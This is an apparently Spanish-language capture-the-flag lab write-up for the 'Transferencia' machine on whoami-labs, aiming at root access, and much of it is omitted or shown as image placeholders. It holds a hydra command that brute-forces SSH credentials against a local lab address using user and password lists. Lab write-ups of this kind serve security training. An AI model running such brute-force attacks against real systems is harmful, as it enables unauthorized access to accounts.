# Writeup Transferencia - whoami-labs
...
| **Dificultad** | Fácil |
| **Autor** | elc0ket |
| **Objetivo** | Obtener acceso al sistema y escalar privilegios hasta ser `root` |
...
![[IMG-20260624105011669.png]]

```bash
cat passwd.txt
```

![[IMG-20260624105039641.png]]
...
```bash
hydra -L users.txt -P passwd.txt ssh://172.17.0.2 -t 4 -f -V
```

**Resultado esperado:**

![[IMG-20260624105422764.png]]
